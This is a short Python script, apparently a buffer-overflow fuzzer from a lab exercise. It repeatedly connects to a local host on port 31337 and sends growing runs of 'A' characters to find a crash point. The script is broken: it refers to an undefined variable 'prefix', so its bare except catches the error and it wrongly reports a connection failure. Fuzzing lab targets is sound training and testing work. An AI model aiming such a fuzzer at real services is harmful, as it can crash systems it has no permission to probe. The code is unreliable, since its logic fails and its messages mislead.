import socket, time, sys

ip = "192.168.0.105"

port = 31337
timeout = 5

string = "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.settimeout(timeout)
         s.connect((ip, port))
         s.recv(1024)
         print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
         s.send(bytes(string, "latin-1"))
         s.recv(1024)
         s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
